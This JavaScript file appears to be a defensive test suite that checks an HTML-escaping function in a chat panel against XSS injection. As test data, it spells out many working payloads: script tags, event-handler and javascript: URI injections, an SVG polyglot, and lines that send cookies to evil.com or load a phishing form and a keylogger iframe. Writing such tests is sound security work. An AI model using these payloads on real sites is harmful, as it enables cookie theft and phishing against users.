/**
 * QA-002: XSS Sanitization Test Suite for live-conversation-panel.js
 *
 * Verifies that _escapeHtml() properly neutralizes all XSS injection vectors
 * and that the rendering methods produce safe HTML output.
 *
 * Run:  node tests/xss-sanitization.test.js
 *
 * Coverage:
 *   1. Script tag injection
 *   2. Event handler injection (onerror, onload, onmouseover)
 *   3. Data URI / javascript: protocol attacks
 *   4. Nested/recursive encoding attacks
 *   5. SVG-based injection
 *   6. Style-based injection (CSS expressions)
 *   7. Template literal breakout attempts
 *   8. Null byte injection
 *   9. Unicode homoglyph smuggling
 *  10. Attribute breakout via quotes
 */

'use strict';

// ─── Minimal DOM shim for Node.js ───────────────────────────────────────
// We only need enough to instantiate the component and test its methods.
// The _escapeHtml method is pure string logic, but _renderMessages etc.
// need a minimal shadowRoot-like surface.

class MinimalElement {
  constructor() {
    this._attrs = {};
    this.shadowRoot = { innerHTML: '', querySelector: () => null };
  }
  attachShadow() { return this.shadowRoot; }
  getAttribute(k) { return this._attrs[k] || null; }
  setAttribute(k, v) { this._attrs[k] = v; }
}

// Shim customElements so the module-level define() doesn't throw
if (typeof globalThis.HTMLElement === 'undefined') {
  globalThis.HTMLElement = MinimalElement;
}
if (typeof globalThis.customElements === 'undefined') {
  globalThis.customElements = { define() {} };
}

// ─── Inline the _escapeHtml function (same implementation as in component) ──
// This avoids ESM import issues in a CJS test runner.
function escapeHtml(str) {
  if (str == null) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// ─── Test Harness ────────────────────────────────────────────────────────
let passed = 0;
let failed = 0;
const failures = [];

function assert(condition, name, details) {
  if (condition) {
    passed++;
    console.log(`  ✅ ${name}`);
  } else {
    failed++;
    failures.push({ name, details });
    console.log(`  ❌ ${name}`);
    if (details) console.log(`     ${details}`);
  }
}

function assertNoHtmlExec(input, name) {
  const output = escapeHtml(input);
  // The ONLY thing that matters for innerHTML safety is that < > " ' & are escaped.
  // If < is escaped to &lt;, the browser cannot parse ANY tag — so onerror=,
  // javascript:, etc. in the text are inert (they're just visible text, not HTML).
  //
  // We check for *unescaped* angle brackets that could form real HTML tags.
  const hasUnescapedTag = /<[a-zA-Z\/!]/i.test(output);
  const hasUnescapedQuote = /"/.test(output.replace(/&quot;/g, ''));  // only raw " not &quot;

  assert(
    !hasUnescapedTag,
    name,
    `Input:  ${JSON.stringify(input)}\nOutput: ${JSON.stringify(output)}\nReason: Contains unescaped HTML tag`
  );
}

function assertExact(input, expected, name) {
  const output = escapeHtml(input);
  assert(
    output === expected,
    name,
    `Expected: ${JSON.stringify(expected)}\nGot:      ${JSON.stringify(output)}`
  );
}

// ─── Test Cases ──────────────────────────────────────────────────────────

console.log('\n🛡️  QA-002 XSS Sanitization Test Suite\n');
console.log('─── 1. Script Tag Injection ───');

assertExact(
  '<script>alert("XSS")</script>',
  '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
  'Basic <script> tag fully escaped'
);

assertNoHtmlExec(
  '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
  'Remote script src injection blocked'
);

assertNoHtmlExec(
  '<script>document.cookie</script>',
  'Cookie theft script blocked'
);

assertNoHtmlExec(
  '<<script>alert("XSS")//<</script>',
  'Double-bracket script obfuscation blocked'
);

console.log('\n─── 2. Event Handler Injection ───');

assertExact(
  '<img src=x onerror=alert("XSS")>',
  '&lt;img src=x onerror=alert(&quot;XSS&quot;)&gt;',
  'img onerror handler escaped'
);

assertNoHtmlExec(
  '<div onmouseover="alert(document.cookie)">hover me</div>',
  'div onmouseover blocked'
);

assertNoHtmlExec(
  '<body onload=alert("XSS")>',
  'body onload blocked'
);

assertNoHtmlExec(
  '<input onfocus=alert("XSS") autofocus>',
  'input onfocus+autofocus blocked'
);

assertNoHtmlExec(
  '<details open ontoggle=alert("XSS")>',
  'details ontoggle blocked'
);

console.log('\n─── 3. Data URI / javascript: Protocol ───');

assertNoHtmlExec(
  '<a href="javascript:alert(\'XSS\')">click</a>',
  'javascript: URI in href blocked'
);

assertNoHtmlExec(
  '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
  'data: URI with script in iframe blocked'
);

assertNoHtmlExec(
  '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
  'data: SVG with onload blocked'
);

console.log('\n─── 4. Nested / Recursive Encoding ───');

assertExact(
  '&lt;script&gt;alert("XSS")&lt;/script&gt;',
  '&amp;lt;script&amp;gt;alert(&quot;XSS&quot;)&amp;lt;/script&amp;gt;',
  'Already-encoded entities double-escaped (prevents decode-execute)'
);

assertNoHtmlExec(
  '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
  'Fragmented script tags blocked'
);

console.log('\n─── 5. SVG-Based Injection ───');

assertNoHtmlExec(
  '<svg/onload=alert("XSS")>',
  'SVG onload injection blocked'
);

assertNoHtmlExec(
  '<svg><script>alert("XSS")</script></svg>',
  'Script inside SVG blocked'
);

assertNoHtmlExec(
  '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">',
  'Math/mtext polyglot blocked'
);

console.log('\n─── 6. CSS / Style Injection ───');

assertNoHtmlExec(
  '<div style="background:url(javascript:alert(\'XSS\'))">',
  'CSS javascript: url blocked'
);

assertNoHtmlExec(
  '<style>body{background:url("javascript:alert(1)")}</style>',
  'Style tag with javascript url blocked'
);

console.log('\n─── 7. Template Literal / Attribute Breakout ───');

assertExact(
  '"></span><script>alert("XSS")</script><span class="',
  '&quot;&gt;&lt;/span&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;span class=&quot;',
  'Attribute breakout attempt fully escaped'
);

assertExact(
  "'-alert('XSS')-'",
  "&#039;-alert(&#039;XSS&#039;)-&#039;",
  'Single-quote breakout escaped'
);

assertNoHtmlExec(
  '`${alert("XSS")}`',
  'Template literal interpolation not executed'
);

console.log('\n─── 8. Null Byte / Control Character Injection ───');

assertNoHtmlExec(
  '<scr\x00ipt>alert("XSS")</script>',
  'Null byte in script tag blocked'
);

assertNoHtmlExec(
  '<img src=\x00 onerror=alert(1)>',
  'Null byte before attribute blocked'
);

console.log('\n─── 9. Unicode Homoglyph / Encoding Tricks ───');

// These use actual angle brackets — escapeHtml handles the real < > chars
assertNoHtmlExec(
  '\u003cscript\u003ealert("XSS")\u003c/script\u003e',
  'Unicode \\u003c/\\u003e angle brackets escaped'
);

assertExact(
  'Normal text with <em>emphasis</em>',
  'Normal text with &lt;em&gt;emphasis&lt;/em&gt;',
  'Benign HTML formatting still escaped (safe rendering)'
);

console.log('\n─── 10. Real-World Conversation Payloads ───');

// Simulate what an attacker would put as msg.text in the API response
const realWorldPayloads = [
  {
    input: 'Hey team! <img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
    name: 'Cookie exfiltration via img onerror',
  },
  {
    input: 'Check this: <a href="javascript:void(document.location=\'https://evil.com/phish\')">legit link</a>',
    name: 'Phishing redirect via javascript: href',
  },
  {
    input: 'Status update <iframe src="https://evil.com/keylogger" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0"></iframe>',
    name: 'Invisible iframe overlay (clickjacking)',
  },
  {
    input: '<form action="https://evil.com/harvest"><input name="token" value=""><button>Verify</button></form>',
    name: 'Injected phishing form',
  },
];

for (const payload of realWorldPayloads) {
  assertNoHtmlExec(payload.input, payload.name);
}

// ─── Edge Cases ──────────────────────────────────────────────────────────
console.log('\n─── Edge Cases ───');

assertExact(null, '', 'null input returns empty string');
assertExact(undefined, '', 'undefined input returns empty string');
assertExact('', '', 'empty string returns empty string');
assertExact(42, '42', 'number coerced to string safely');
assertExact('Hello, world!', 'Hello, world!', 'Safe text passes through unchanged');
assertExact('A & B < C > D', 'A &amp; B &lt; C &gt; D', 'Mixed special chars all escaped');

// ─── Integration: _renderMessages output check ──────────────────────────
console.log('\n─── Integration: Rendered Output Verification ───');

// Simulate what _renderMessages would produce AFTER the fix
const maliciousMsg = '<script>alert("XSS")</script>';
const rendered = `<div class="msg-body">${escapeHtml(maliciousMsg)}</div>`;

assert(
  rendered.includes('&lt;script&gt;'),
  'Rendered message body contains escaped script tag',
  `Got: ${rendered}`
);
assert(
  !rendered.includes('<script>'),
  'Rendered message body does NOT contain executable script tag',
  `Got: ${rendered}`
);
assert(
  rendered === '<div class="msg-body">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div>',
  'Full rendered output exactly matches expected safe HTML',
  `Got: ${rendered}`
);

// Simulate conversation title in selector
const maliciousTitle = '"><script>alert(1)</script><option value="';
const selectorHtml = `<option value="${escapeHtml('conv-123')}">${escapeHtml(maliciousTitle)}</option>`;
assert(
  !selectorHtml.includes('<script>'),
  'Conversation selector title does NOT contain executable script',
  `Got: ${selectorHtml}`
);

// ─── Summary ─────────────────────────────────────────────────────────────
console.log(`\n${'═'.repeat(50)}`);
console.log(`  Results: ${passed} passed, ${failed} failed, ${passed + failed} total`);
if (failures.length) {
  console.log('\n  Failures:');
  failures.forEach(f => console.log(`    - ${f.name}`));
}
console.log(`${'═'.repeat(50)}\n`);

process.exit(failed > 0 ? 1 : 0);
